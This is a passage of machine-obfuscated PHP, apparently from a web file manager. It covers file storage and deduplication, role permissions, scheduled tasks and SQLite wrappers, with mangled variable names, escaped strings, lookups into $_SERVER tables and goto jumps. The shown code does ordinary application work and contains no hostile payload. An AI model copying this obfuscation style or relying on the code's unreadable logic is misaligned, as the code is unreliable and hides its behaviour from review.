$é‘ûÅíè[$¯ËÀ­â[1897]][$¯ËÀ­â[466]] = $­µ½¤Œù[$é‘ûÅíè[$¯ËÀ­â[1897]][$¯ËÀ­â[1887]]]; } } unset($é‘ûÅíè); } private function metaList($¦İ‘ÄˆÖ) { $Î¢‘©Ÿ© =& $_SERVER[ä¿÷‹µ±]; if (!$¦İ‘ÄˆÖ) { return array(); } $¹œ˜¾ô³ = array($Î¢‘©Ÿ©[1887] => array($Î¢‘©Ÿ©[7], $¦İ‘ÄˆÖ)); $ğé·ÙĞŸ = Model($Î¢‘©Ÿ©[1898])->where($¹œ˜¾ô³)->select(); $ğé·ÙĞŸ = array_to_keyvalue_group($ğé·ÙĞŸ, $Î¢‘©Ÿ©[1887]); foreach ($ğé·ÙĞŸ as $ÎıÆ–‹Ü => $“ÂÌ‹Äˆ) { $°»„×© = array(); foreach ($“ÂÌ‹Äˆ as $ìè…­¼) { $°»„×©[$ìè…­¼[$Î¢‘©Ÿ©[94]]] = $ìè…­¼[$Î¢‘©Ÿ©[374]]; } $ğé·ÙĞŸ[$ÎıÆ–‹Ü] = $°»„×©; } return $ğé·ÙĞŸ ? $ğé·ÙĞŸ : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\137\146\x69\x6c\145\137\x63\x6f\156\164\x65\156\x74\x73"; protected $dataAuto = array(array("\143\x72\x65\141\x74\x65\x54\151\155\145", "\164\x69\155\145", "\x69\x6e\x73\x65\162\x74", "\x66\165\x6e\143\164\x69\157\x6e")); } class FileModel extends ModelBase { protected $tableName = "\151\157\137\x66\x69\154\x65"; protected $tableMeta = array("\x74\141\142\154\145\x4e\x61\x6d\x65" => "\151\157\x5f\x66\x69\154\x65\x5f\x6d\x65\164\141", "\155\x65\164\141\x46\x69\145\x6c\x64" => "\x66\x69\154\x65\111\x44"); public function fileInfo($€íÃœÔ–) { $ÃıÏ¹« =& $_SERVER[ä¿÷‹µ±]; static $’êò¶ë§ = array(); if (!isset($’êò¶ë§[$€íÃœÔ–])) { $ÙıÌ­Öµ = $ÃıÏ¹«[1899]; $©ïç¶ö = Model($ÃıÏ¹«[471])->field($ÙıÌ­Öµ)->where(array($ÃıÏ¹«[469] => $€íÃœÔ–))->find(); $’êò¶ë§[$€íÃœÔ–] = $©ïç¶ö; } return $’êò¶ë§[$€íÃœÔ–]; } public function addFileByContent($µùìË´ş = '', $¿å­Ä‡Ÿ = '') { $Ñ¨•Õõ÷ =& $_SERVER[ä¿÷‹µ±]; $¨ëÃ¸Ø = TEMP_PATH . $Ñ¨•Õõ÷[1900]; if (!is_dir($¨ëÃ¸Ø)) { mk_dir($¨ëÃ¸Ø); } $Üş×Ææ = $¨ëÃ¸Ø . $Ñ¨•Õõ÷[1901] . rand_string(16); file_put_contents($Üş×Ææ, $µùìË´ş); $øºÊèî = $this->addFile($Üş×Ææ, $¿å­Ä‡Ÿ, !0); if (file_exists($Üş×Ææ)) { @unlink($Üş×Ææ); } return $øºÊèî; } public function createFileName($ÓÌÕå‘ô, $¯åº×– = false, $‰×»·Æ¶ = false) { $À‘Ê†› =& $_SERVER[ä¿÷‹µ±]; $à†Ÿâ¤… = IO::init($À‘Ê†›[8]); $¦ğ©›ÂŸ = $this->makeFilePath($ÓÌÕå‘ô, $à†Ÿâ¤…, $¯åº×–, $‰×»·Æ¶); $à–ÑöÒ = $à†Ÿâ¤…->pathFather($¦ğ©›ÂŸ); static $ÎãÎõı¸ = false; $Ïô¯±Ó¦ = $À‘Ê†›[1902] . md5($à–ÑöÒ); if (!$ÎãÎõı¸ && !Cache::get($Ïô¯±Ó¦)) { $ÎãÎõı¸ = !0; $Óº´ÕË– = IO::mkdir($à–ÑöÒ); if (!IO::exist($Óº´ÕË– . $À‘Ê†›[816])) { IO::mkfile($Óº´ÕË– . $À‘Ê†›[816]); } Cache::set($Ïô¯±Ó¦, 1, 3600 * 2); } return $¦ğ©›ÂŸ; } public function makeFilePath($ã©Œ˜Óõ, $ò¶Ì¾ˆõ, $°ÁÄÕ—¾ = false, $è§ß» = false) { $­óş™ =& $_SERVER[ä¿÷‹µ±]; $©¹ëüùÇ = Model($­óş™[789])->get($­óş™[1903]); $Á¾í™„ã = KodIO::defaultIO() . date($­óş™[1904]); $ÅäÊ•µ = $Á¾í™„ã . rand_string(5) . short_id(100); $ã©Œ˜Óõ = str_replace($­óş™[8], $­óş™[11], KodIO::clear($ã©Œ˜Óõ)); $­‡ô·Ó = $ò¶Ì¾ˆõ->ext($ã©Œ˜Óõ); if (!$ã©Œ˜Óõ) { $©¹ëüùÇ = $­óş™[1905]; } switch ($©¹ëüùÇ) { case $­óş™[1906]: $ÅäÊ•µ = $ÅäÊ•µ . $­óş™[10] . $ò¶Ì¾ˆõ->ext($ã©Œ˜Óõ); if ($­‡ô·Ó == $­óş™[1843]) { $ÅäÊ•µ .= $­óş™[1572]; } break; case $­óş™[1907]: $à´–ì³ = Model($­óş™[789])->get($­óş™[790]); $‡ã÷Î”ı = substr(md5($­óş™[791] . $à´–ì³ . date($­óş™[767])), 0, 8); $ûÃ¯ç¹É = KodIO::defaultDriver(); $Á¾í™„ã = $­óş™[1251] . $ûÃ¯ç¹É[$­óş™[399]] . $­óş™[409] . date($­óş™[1908]) . $‡ã÷Î”ı . $­óş™[8]; if ($­‡ô·Ó == $­óş™[1843]) { $ã©Œ˜Óõ .= $­óş™[1572]; } $Ùß„¸šÏ = $­óş™[1909] . $Á¾í™„ã . $ã©Œ˜Óõ; CacheLock::lock($Ùß„¸šÏ); $ÅäÊ•µ = $Á¾í™„ã . $ã©Œ˜Óõ; if (IO::exist($Á¾í™„ã . $ã©Œ˜Óõ)) { $„òª¬Ìı = substr($ã©Œ˜Óõ, 0, strlen($ã©Œ˜Óõ) - strlen($­‡ô·Ó)); $ĞÉ“åË = $è§ß» ? substr($è§ß», 0, 5) : ($°ÁÄÕ—¾ ? substr($°ÁÄÕ—¾, 0, 5) : rand_string(5)); $ÅäÊ•µ = $Á¾í™„ã . $„òª¬Ìı . $ĞÉ“åË . $­óş™[10] . $­‡ô·Ó; } if (IO::isTypeObject($ÅäÊ•µ) && !IO::isUploadServer($ÅäÊ•µ)) { if (IO::exist($ÅäÊ•µ)) { return $ÅäÊ•µ; } $î¹„Çåİ = IO::setContent($ÅäÊ•µ, $­óş™[12]); if (!$î¹„Çåİ) { show_json($­óş™[1910], !1); } } CacheLock::unlock($Ùß„¸šÏ); break; case $­óş™[1905]: break; default: break; } return $ÅäÊ•µ; } public function addFileByRemote($ıÓÛ±¨Š, $¼úŞæ£†, $Ã…Éç¡ = array()) { $”‚ÏÙ”” =& $_SERVER[ä¿÷‹µ±]; if (!IO::exist($ıÓÛ±¨Š)) { return !1; } $ÇøğÔãâ = $Ã…Éç¡[$”‚ÏÙ””[176]] ? $Ã…Éç¡[$”‚ÏÙ””[176]] : $”‚ÏÙ””[12]; $‘°™öõ = IO::hashMd5($ıÓÛ±¨Š, $ÇøğÔãâ); $ˆ¢ ‹Ï› = KodIO::defaultDriver(); $«ÅìíÕï = array($”‚ÏÙ””[585] => IO::size($ıÓÛ±¨Š), $”‚ÏÙ””[1911] => 1, $”‚ÏÙ””[420] => $¼úŞæ£†, $”‚ÏÙ””[827] => $ˆ¢ ‹Ï›[$”‚ÏÙ””[399]], $”‚ÏÙ””[421] => $ıÓÛ±¨Š, $”‚ÏÙ””[1912] => $Ã…Éç¡[$”‚ÏÙ””[177]] ? $Ã…Éç¡[$”‚ÏÙ””[177]] : IO::hashSimple($ıÓÛ±¨Š), $”‚ÏÙ””[1913] => $‘°™öõ ? $‘°™öõ : $ÇøğÔãâ); if ($ëÑÍ¡š¨ = $this->addFileCheckExist($«ÅìíÕï[$”‚ÏÙ””[177]], $«ÅìíÕï[$”‚ÏÙ””[176]], $«ÅìíÕï[$”‚ÏÙ””[76]])) { return $ëÑÍ¡š¨; } return $this->addFileData($«ÅìíÕï); } private function addFileData($Ì¡»ÑÈ) { $Ã²‚Å‚¾ =& $_SERVER[ä¿÷‹µ±]; if (!$Ì¡»ÑÈ) { return !1; } $Ì¡»ÑÈ[$Ã²‚Å‚¾[76]] = intval($Ì¡»ÑÈ[$Ã²‚Å‚¾[76]]); if (!$Ì¡»ÑÈ[$Ã²‚Å‚¾[76]] && strlen($Ì¡»ÑÈ[$Ã²‚Å‚¾[177]]) > 32) { $Ì¡»ÑÈ[$Ã²‚Å‚¾[76]] = intval(substr($Ì¡»ÑÈ[$Ã²‚Å‚¾[177]], 32)); } $Ô¬€ƒİ€ = $this->add($Ì¡»ÑÈ); return $this->find($Ô¬€ƒİ€); } public function addFile($í°´›Ü‚, $„ëö…†², $‹¯ıûèÒ = false) { $™Â Ã™Ê =& $_SERVER[ä¿÷‹µ±]; $ó’¢ÙÇÚ = IO::hashSimple($í°´›Ü‚); $˜ä‘óúİ = IO::size($í°´›Ü‚); $Ñ³Æ³ÅÆ = $˜ä‘óúİ <= 1024 * 1024 * 10 ? IO::hashMd5($í°´›Ü‚) : $™Â Ã™Ê[12]; $‘÷ì² = $™Â Ã™Ê[1914] . $ó’¢ÙÇÚ; CacheLock::lock($‘÷ì²); if ($Ñ³Æ³ÅÆ && $ó’¢ÙÇÚ) { $Œ’õÊÄ = $this->addFileCheckExist($ó’¢ÙÇÚ, $Ñ³Æ³ÅÆ, $˜ä‘óúİ); if ($Œ’õÊÄ) { CacheLock::unlock($‘÷ì²); return $Œ’õÊÄ; } } $ÍÑƒûĞè = $this->addFileMake($í°´›Ü‚, $˜ä‘óúİ, $ó’¢ÙÇÚ, $Ñ³Æ³ÅÆ, $„ëö…†², $‹¯ıûèÒ); $¢ìğåü = $this->addFileData($ÍÑƒûĞè); CacheLock::unlock($‘÷ì²); if (!$Ñ³Æ³ÅÆ && $¢ìğåü) { $this->fileMd5Check($¢ìğåü); } return $¢ìğåü; } private function fileMd5Check($ãŸÔŸ) { $®Ç¼ÆÛÖ =& $_SERVER[ä¿÷‹µ±]; $ñì€©È = array($ãŸÔŸ[$®Ç¼ÆÛÖ[468]], $ãŸÔŸ[$®Ç¼ÆÛÖ[84]]); $Á»Ã¿Àµ = $®Ç¼ÆÛÖ[1915] . $ãŸÔŸ[$®Ç¼ÆÛÖ[84]]; $ˆÚÕ±Ğİ = $®Ç¼ÆÛÖ[1916] . $ãŸÔŸ[$®Ç¼ÆÛÖ[468]]; $“§Ø÷†Ú = TaskQueue::add($®Ç¼ÆÛÖ[1917], $ñì€©È, $Á»Ã¿Àµ, $ˆÚÕ±Ğİ); if (!$“§Ø÷†Ú) { $this->fileMd5Set($ãŸÔŸ[$®Ç¼ÆÛÖ[468]], $ãŸÔŸ[$®Ç¼ÆÛÖ[84]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($¤—ôÑó, $ğ‰¼ ïÄ) { $ê–ş³™‹ =& $_SERVER[ä¿÷‹µ±]; $‚´ÒËá× = $this->find($¤—ôÑó); if (!$‚´ÒËá× || $‚´ÒËá×[$ê–ş³™‹[176]]) { return; } $¡òø´ùµ = IO::hashMd5($ğ‰¼ ïÄ); if (!$¡òø´ùµ) { return $ê–ş³™‹[12]; } $this->where(array($ê–ş³™‹[468] => $¤—ôÑó))->save(array($ê–ş³™‹[176] => $¡òø´ùµ)); } public function addFileMake($ÁÙÄÈÄÔ, $«¥€º†Œ, $¼ÖÛá´, $Œ½üñÊé, $‘êİÔõµ, $ÕÇçïº¢) { $¼ù•¿ =& $_SERVER[ä¿÷‹µ±]; $şœ•àåÅ = $this->createFileName($‘êİÔõµ, $¼ÖÛá´, $Œ½üñÊé); $éÖàş© = get_path_father($şœ•àåÅ); $˜‰”¥ã = get_path_this($şœ•àåÅ); if ($ÕÇçïº¢) { $£—ı°Û = IO::move($ÁÙÄÈÄÔ, $éÖàş©, !1, $˜‰”¥ã); } else { $£—ı°Û = IO::copy($ÁÙÄÈÄÔ, $éÖàş©, !1, $˜‰”¥ã); } if (!$£—ı°Û) { return !1; } $’‹ôÆÜÉ = KodIO::defaultDriver(); $ ¼Á‚ÇŸ = array($¼ù•¿[585] => $«¥€º†Œ, $¼ù•¿[1911] => 1, $¼ù•¿[420] => $‘êİÔõµ, $¼ù•¿[827] => $’‹ôÆÜÉ[$¼ù•¿[399]], $¼ù•¿[421] => $şœ•àåÅ, $¼ù•¿[1912] => $¼ÖÛá´, $¼ù•¿[1913] => $Œ½üñÊé); return $ ¼Á‚ÇŸ; } public function addFileCheckExist($Æ§şÌ°, $Ëèôôìâ, $…Áßú“„) { $°£îÎ¸› =& $_SERVER[ä¿÷‹µ±]; $‚«Ï±„ = $this->findByHash($Æ§şÌ°, $Ëèôôìâ); if (!$‚«Ï±„) { return !1; } $ğŠÁÔœî = array($°£îÎ¸›[1911] => intval($‚«Ï±„[$°£îÎ¸›[1918]]) + 1, $°£îÎ¸›[585] => $…Áßú“„); $this->where(array($°£îÎ¸›[469] => $‚«Ï±„[$°£îÎ¸›[468]]))->save($ğŠÁÔœî); return $‚«Ï±„; } public function remove($Ş… ™Œ) { $this->linkCountChange($Ş… ™Œ, !1); $this->clearEmpty(); return !0; } public function linkAdd($Ëª·À–) { $this->linkCountChange($Ëª·À–, !0); } public function linkCountChange($½„ú†¢‰, $ÜĞƒ¸£) { $ËŠ„‹Ü =& $_SERVER[ä¿÷‹µ±]; if (!$½„ú†¢‰) { return; } if (!is_array($½„ú†¢‰)) { $½„ú†¢‰ = array($½„ú†¢‰); } $ä±†Œ· = array(); foreach ($½„ú†¢‰ as $‰Ä¸ÖĞğ) { $ÚÆ”ã¤§ = $‰Ä¸ÖĞğ . $ËŠ„‹Ü[12]; if (!$ä±†Œ·[$ÚÆ”ã¤§]) { $ä±†Œ·[$ÚÆ”ã¤§] = 0; } $ä±†Œ·[$ÚÆ”ã¤§]++; } $ÜŞ’¦ = array(); foreach ($ä±†Œ· as $‰Ä¸ÖĞğ => $´½êşçú) { $ÚÆ”ã¤§ = $´½êşçú . $ËŠ„‹Ü[12]; if (!$ÜŞ’¦[$ÚÆ”ã¤§]) { $ÜŞ’¦[$ÚÆ”ã¤§] = array(); } $ÜŞ’¦[$ÚÆ”ã¤§][] = $‰Ä¸ÖĞğ; } foreach ($ÜŞ’¦ as $´½êşçú => $Ú¦ãœå) { if (!$Ú¦ãœå) { continue; } $´½êşçú = $ÜĞƒ¸£ ? $´½êşçú : -intval($´½êşçú); $û¾åêŒµ = array($ËŠ„‹Ü[468] => array($ËŠ„‹Ü[7], $Ú¦ãœå)); if ($´½êşçú < 0) { $û¾åêŒµ[$ËŠ„‹Ü[1918]] = array($ËŠ„‹Ü[1037], abs($´½êşçú)); } $this->where($û¾åêŒµ)->setAdd($ËŠ„‹Ü[1918], $´½êşçú); } } public function findByHash($¦Ò÷öøÎ, $˜´Àåô = false) { $Ù‚Ê÷‘” =& $_SERVER[ä¿÷‹µ±]; if (!$¦Ò÷öøÎ && !$˜´Àåô) { return !1; } $äŒÄÛ„õ = array($Ù‚Ê÷‘”[1912] => $¦Ò÷öøÎ); if ($˜´Àåô) { $äŒÄÛ„õ = array($Ù‚Ê÷‘”[1913] => $˜´Àåô); } return $this->order($Ù‚Ê÷‘”[1919])->where($äŒÄÛ„õ)->find(); } public function clearEmpty($¥×°™êÎ = 0) { $ µôÑö =& $_SERVER[ä¿÷‹µ±]; $š¯²Ì‰õ = time() - 3600 * 24 * $¥×°™êÎ; $Ã‚ÇŒØ = $ µôÑö[1920] . $š¯²Ì‰õ; $óÓ–˜¢í = $this->where($Ã‚ÇŒØ)->select(); if (!$óÓ–˜¢í) { return; } $é‚ı¾€Ó = new Task($ µôÑö[1921], $ µôÑö[12], count($óÓ–˜¢í)); foreach ($óÓ–˜¢í as $¾À¡°ë€) { $é‚ı¾€Ó->update(1); $this->resetFile($¾À¡°ë€); } $é‚ı¾€Ó->end(); } public function resetFile($¡©èé¦ğ) { $Â®Æüñ =& $_SERVER[ä¿÷‹µ±]; $·œéº“ = array($Â®Æüñ[469] => $¡©èé¦ğ[$Â®Æüñ[468]]); $¿áÓ ´Ÿ = Model($Â®Æüñ[1349])->where($·œéº“)->count(); $üï’Ğ¼‚ = Model($Â®Æüñ[1922])->where($·œéº“)->count(); $ƒë€ÓĞş = intval($¿áÓ ´Ÿ) + intval($üï’Ğ¼‚); if ($ƒë€ÓĞş == 0) { IO::remove($¡©èé¦ğ[$Â®Æüñ[84]]); Model($Â®Æüñ[1923])->delete($¡©èé¦ğ[$Â®Æüñ[468]]); $this->where($·œéº“)->delete(); $this->metaSet($¡©èé¦ğ[$Â®Æüñ[468]], null, null); return; } if ($¡©èé¦ğ[$Â®Æüñ[1918]] != $ƒë€ÓĞş) { $this->where($·œéº“)->save(array($Â®Æüñ[1911] => $ƒë€ÓĞş)); } } public function storageInfo($ı¼ÚÙ¿ß = false) { $‰²­ñœù =& $_SERVER[ä¿÷‹µ±]; $¿ßÛë´À = $this->count() + 0.0; $ÎîÈÂÅş = 0; $­ı”ˆì = 1; $õö™Ø¼¼ = 0; $¤ÕŒá = 5000; for ($µÅ¿¯½ = 0; $µÅ¿¯½ < $¿ßÛë´À; $µÅ¿¯½ = $µÅ¿¯½ + $¤ÕŒá) { $Ç…£€Íì = $this->limit($µÅ¿¯½, $µÅ¿¯½ + $¤ÕŒá)->select(); foreach ($Ç…£€Íì as $âæÜİõ) { $­ı”ˆì += $âæÜİõ[$‰²­ñœù[76]] * $âæÜİõ[$‰²­ñœù[1918]]; $ÎîÈÂÅş += $âæÜİõ[$‰²­ñœù[76]] * ($âæÜİõ[$‰²­ñœù[1918]] - 1); $õö™Ø¼¼ += $âæÜİõ[$‰²­ñœù[1918]]; } } $¸¯˜û¥ = array($‰²­ñœù[1924] => $­ı”ˆì, $‰²­ñœù[1925] => $ÎîÈÂÅş, $‰²­ñœù[1926] => $ÎîÈÂÅş / $­ı”ˆì, $‰²­ñœù[80] => $¿ßÛë´À, $‰²­ñœù[1927] => $õö™Ø¼¼); return $¸¯˜û¥; } } goto C¼¤´“ËÙ¡; Cô¥¶ä„¥©: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\155\x2e\x72\x6f\154\x65\x4c\151\163\164"; public $field = array("\x6e\141\155\145", "\x61\x75\164\x68", "\154\141\x62\x65\x6c", "\144\151\163\x70\x6c\141\x79", "\x73\171\x73\164\x65\155", "\144\x65\x73\x63", "\151\x67\156\157\162\x65\x45\x78\x74", "\x69\x67\156\157\x72\x65\x46\151\x6c\145\x53\151\172\x65", "\141\x64\155\x69\156\151\x73\x74\162\141\x74\x6f\162", "\x73\x6f\x72\x74"); public function listData($ÎÍ×Ï¤ = false, $šüÙšÔ = "\163\157\162\164", $Ö×ÒÉ = false) { $œµ·½ı =& $_SERVER[ä¿÷‹µ±]; $™µ´¦øÓ = parent::listData($ÎÍ×Ï¤, $šüÙšÔ, $Ö×ÒÉ); if (!$ÎÍ×Ï¤) { foreach ($™µ´¦øÓ as $‰Õ‰èç‡ => $Ÿ›¹ŸÍ”) { if ($Ÿ›¹ŸÍ”[$œµ·½ı[2048]] == 1) { $™µ´¦øÓ[$‰Õ‰èç‡][$œµ·½ı[453]] = LNG($œµ·½ı[2283]); } } } return $™µ´¦øÓ; } public function update($¾»©ş°, $Ùé¾éÃ¯) { $âª°€  =& $_SERVER[ä¿÷‹µ±]; $Ç’ÃÕã = parent::listData($¾»©ş°); $¶ª…Ôô = $this->findByName($Ùé¾éÃ¯[$âª°€ [32]]); if (!$Ç’ÃÕã || $¶ª…Ôô && $¶ª…Ôô[$âª°€ [399]] != $Ç’ÃÕã[$âª°€ [399]]) { return !1; } if ($¶ª…Ôô[$âª°€ [2048]] == 1) { $Ùé¾éÃ¯ = array($âª°€ [32] => $Ùé¾éÃ¯[$âª°€ [32]], $âª°€ [1873] => $Ùé¾éÃ¯[$âª°€ [1873]]); } $this->filterAuth($Ùé¾éÃ¯[$âª°€ [413]]); return parent::update($¾»©ş°, $Ùé¾éÃ¯); } public function remove($îæî§Óì) { $Œ¶ì­Üµ = parent::listData($îæî§Óì); if (!$Œ¶ì­Üµ || $Œ¶ì­Üµ[$_SERVER[ä¿÷‹µ±][1298]]) { return !1; } return parent::remove($îæî§Óì); } public function add($Ú£úÁœÒ) { $àÎ‘İõÏ =& $_SERVER[ä¿÷‹µ±]; $ã€—ùÏÔ = $Ú£úÁœÒ[$àÎ‘İõÏ[32]]; if ($this->findByName($ã€—ùÏÔ)) { return !1; } $àËô–£ = array($àÎ‘İõÏ[420] => $ã€—ùÏÔ, $àÎ‘İõÏ[1856] => $àÎ‘İõÏ[12], $àÎ‘İõÏ[1852] => $àÎ‘İõÏ[1860], $àÎ‘İõÏ[2284] => 1, $àÎ‘İõÏ[1855] => 0, $àÎ‘İõÏ[2285] => 0, $àÎ‘İõÏ[1854] => $this->getSort()); $Ú£úÁœÒ = array_merge($àËô–£, $Ú£úÁœÒ); $this->filterAuth($Ú£úÁœÒ[$àÎ‘İõÏ[413]]); return parent::insert($Ú£úÁœÒ); } private function getSort() { $ø“’Õûİ =& $_SERVER[ä¿÷‹µ±]; $ƒÏŸò = parent::listData(); $ÓœÇ£•Ğ = array_to_keyvalue($ƒÏŸò, $ø“’Õûİ[12], $ø“’Õûİ[1874]); return empty($ÓœÇ£•Ğ) ? 0 : max($ÓœÇ£•Ğ) + 1; } private function filterAuth(&$¿ÕïƒÊø) { $ù¶öèÄ =& $_SERVER[ä¿÷‹µ±]; $Îë’ıñ¸ = array(); $üâıãÂò = array_filter(explode($ù¶öèÄ[50], $¿ÕïƒÊø)); foreach ($üâıãÂò as $¿ÕïƒÊø) { $†‡·¨ÈÕ = explode($ù¶öèÄ[10], $¿ÕïƒÊø); if ($†‡·¨ÈÕ[0] == $ù¶öèÄ[2286] && $†‡·¨ÈÕ[1] != $ù¶öèÄ[1217]) { $±İòàÑ½ = $†‡·¨ÈÕ[0] . $ù¶öèÄ[10] . $†‡·¨ÈÕ[1] . $ù¶öèÄ[2287]; if (!in_array($±İòàÑ½, $üâıãÂò)) { $Îë’ıñ¸[] = $±İòàÑ½; } } $Îë’ıñ¸[] = $¿ÕïƒÊø; } $¿ÕïƒÊø = implode($ù¶öèÄ[50], $Îë’ıñ¸); } public function findRoleDefault() { $«¥ÆäÓ« =& $_SERVER[ä¿÷‹µ±]; $Û°³”–« = parent::listData(); $ä¬ˆÚÀÜ = !1; foreach ($Û°³”–« as $…Ää¨ ¿) { if (!$…Ää¨ ¿ || $…Ää¨ ¿[$«¥ÆäÓ«[1872]] == $«¥ÆäÓ«[197] || $…Ää¨ ¿[$«¥ÆäÓ«[2048]] == 1) { continue; } if (strstr($…Ää¨ ¿[$«¥ÆäÓ«[413]], $«¥ÆäÓ«[2288])) { continue; } if (!strstr($…Ää¨ ¿[$«¥ÆäÓ«[413]], $«¥ÆäÓ«[2289])) { continue; } if (!$ä¬ˆÚÀÜ) { $ä¬ˆÚÀÜ = $…Ää¨ ¿; continue; } $æ«‹¶ü§ = explode($«¥ÆäÓ«[50], $ä¬ˆÚÀÜ[$«¥ÆäÓ«[413]]); $ò®Ö…ç = explode($«¥ÆäÓ«[50], $…Ää¨ ¿[$«¥ÆäÓ«[413]]); if (count($æ«‹¶ü§) > count($ò®Ö…ç)) { $ä¬ˆÚÀÜ = $…Ää¨ ¿; } } return $ä¬ˆÚÀÜ ? $ä¬ˆÚÀÜ[$«¥ÆäÓ«[399]] : $«¥ÆäÓ«[12]; } public function sort($²®£÷—Õ, $ıéÃ²¿‹) { return parent::update($²®£÷—Õ, $ıéÃ²¿‹); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\155\56\x74\141\x73\153\x4c\151\163\164"; public $field = array("\x6e\x61\x6d\x65", "\x74\x79\160\x65", "\x65\x76\x65\x6e\164", "\x74\151\155\x65", "\x64\x65\x73\x63", "\x73\x79\163\x74\x65\x6d", "\x65\156\x61\x62\x6c\145", "\x6c\141\163\164\122\165\156", "\x73\157\x72\164"); public function listData($÷Íá¹§› = false, $¨ËÆÛªş = "\x73\x6f\162\x74", $šŒ™‹×º = false) { return parent::listData($÷Íá¹§›, $¨ËÆÛªş, $šŒ™‹×º); } public function add($ˆúµ©ò) { $Ò¾ÌÌÍÂ =& $_SERVER[ä¿÷‹µ±]; $¡Ê§Ğèì = $this->findByName($ˆúµ©ò[$Ò¾ÌÌÍÂ[32]]); if ($¡Ê§Ğèì) { return !1; } $ˆúµ©ò[$Ò¾ÌÌÍÂ[1638]] = 0; $ˆúµ©ò[$Ò¾ÌÌÍÂ[1874]] = $this->getSort(); return parent::insert($ˆúµ©ò); } private function getSort() { $Å²û =& $_SERVER[ä¿÷‹µ±]; $Ç‚¥›Ú = parent::listData(); $‰ñ’€âö = array_to_keyvalue($Ç‚¥›Ú, $Å²û[12], $Å²û[1874]); return empty($‰ñ’€âö) ? 0 : max($‰ñ’€âö) + 1; } public function update($ëÂ°öõ , $­ü‚²³ä) { $„„ÚÔíÁ =& $_SERVER[ä¿÷‹µ±]; $ê¹«ë‡Ä = $this->listData($ëÂ°öõ ); $‰‚İÅï˜ = $this->findByName($­ü‚²³ä[$„„ÚÔíÁ[32]]); if (!$ê¹«ë‡Ä || $‰‚İÅï˜ && $‰‚İÅï˜[$„„ÚÔíÁ[399]] != $ê¹«ë‡Ä[$„„ÚÔíÁ[399]]) { return !1; } return parent::update($ëÂ°öõ , $­ü‚²³ä); } public function remove($ ı“Áäõ, $ÒõÔ¾Û = false) { $šœóÛÍº =& $_SERVER[ä¿÷‹µ±]; $¦İ§Êøß = $this->listData($ ı“Áäõ); if (!$¦İ§Êøß) { return; } if (!$ÒõÔ¾Û && $¦İ§Êøß[$šœóÛÍº[1298]] == $šœóÛÍº[88]) { return !1; } return parent::remove($ ı“Áäõ); } public function enable($ŒÀÒÏñë, $“ø”Ä³€) { return $this->update($ŒÀÒÏñë, array($_SERVER[ä¿÷‹µ±][2278] => $“ø”Ä³€)); } public function run($–ûµùÃµ) { return $this->update($–ûµùÃµ, array($_SERVER[ä¿÷‹µ±][2290] => time())); } } goto Bó£ºäÌÏ‡; Eö«óìó©: class DbSqlite extends DbSqliteBase { public function query($ç¹¬¨¤¸) { $®›ò†²¿ =& $_SERVER[ä¿÷‹µ±]; if (!CacheLock::fileLock($®›ò†²¿[13])) { return !1; } $¶¸Ö‰æ¬ = parent::query($ç¹¬¨¤¸); CacheLock::fileUnLock($®›ò†²¿[13]); return $¶¸Ö‰æ¬; } public function execute($—§ìœ×ñ) { $ÚÕÙóİå =& $_SERVER[ä¿÷‹µ±]; if (!CacheLock::fileLock($ÚÕÙóİå[13])) { return !1; } $ÅÕÔ–ş = parent::execute($—§ìœ×ñ); CacheLock::fileUnLock($ÚÕÙóİå[13]); return $ÅÕÔ–ş; } } class DbSqlite3 extends DbSqlite3Base { public function query($„ıÈñí) { $»ó×€õş =& $_SERVER[ä¿÷‹µ±]; if (!CacheLock::fileLock($»ó×€õş[13])) { return !1; } $œŞáÎÊú = parent::query($„ıÈñí); CacheLock::fileUnLock($»ó×€õş[13]); return $œŞáÎÊú; } public function execute($¢¼íˆîÀ) { $òºñµÏ =& $_SERVER[ä¿÷‹µ±]; if (!CacheLock::fileLock($òºñµÏ[13])) { return !1; } $©ôüÕ = parent::execute($¢¼íˆîÀ); CacheLock::fileUnLock($òºñµÏ[13]); return $©ôüÕ; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\x68\x69\x6e\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\x3d", "\156\x65\161" => "\x3c\76", "\x67\164" => "\x3e", "\x65\x67\164" => "\x3e\x3d", "\154\164" => "\x3c", "\145\154\x74" => "\74\75", "\156\x6f\164\x6c\151\x6b\x65" => "\116\x4f\x54\40\114\x49\x4b\x45", "\154\x69\153\145" => "\114\111\x4b\x45", "\x69\156" => "\x49\116", "\156\157\x74\x69\x6e" => "\116\x4f\124\x20\111\x4e", "\x6e\157\x74\x20\x69\x6e" => "\x4e\x4f\124\40\x49\x4e", "\142\145\164\167\x65\145\x6e" => "\102\x45\x54\x57\105\x45\x4e", "\x6e\x6f\164\x62\x65\164\167\145\x65\x6e" => "\x4e\117\x54\x20\x42\105\x54\x57\x45\105\116", "\x6e\157\x74\x20\142\x65\164\167\x65\145\156" => "\116\117\124\x20\x42\105\124\127\105\105\116"); protected $selectSql = "\123\105\114\105\103\124\x25\104\111\123\x54\x49\116\x43\x54\x25\x20\45\106\111\x45\114\x44\45\x20\x46\x52\x4f\x4d\x20\45\124\x41\102\x4c\105\x25\45\112\117\x49\x4e\45\x25\x57\x48\105\x52\x45\x25\45\107\122\117\125\120\45\45\x48\x41\126\x49\116\x47\x25\45\117\122\104\105\122\x25\45\114\x49\x4d\111\x54\45\40\45\x55\x4e\111\117\x4e\x25\x25\103\x4f\115\115\x45\116\x54\x25"; protected $bind = array(); public static function getInstance() { $úÆÛã·Ê = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ä¿÷‹µ±][982], $úÆÛã·Ê); } public function factory($”öåÑ = '') { $©›üáÂ =& $_SERVER[ä¿÷‹µ±]; $”öåÑ = $this->parseConfig($”öåÑ); if (empty($”öåÑ[$©›üáÂ[983]])) { think_exception(think_lang($©›üáÂ[984])); } $this->dbType = ucwords(strtolower($”öåÑ[$©›üáÂ[983]])); $Å”Ì“—˜ = $©›üáÂ[985] . $this->dbType; if (class_exists($Å”Ì“—˜)) { $Ã‘®Ô² = new 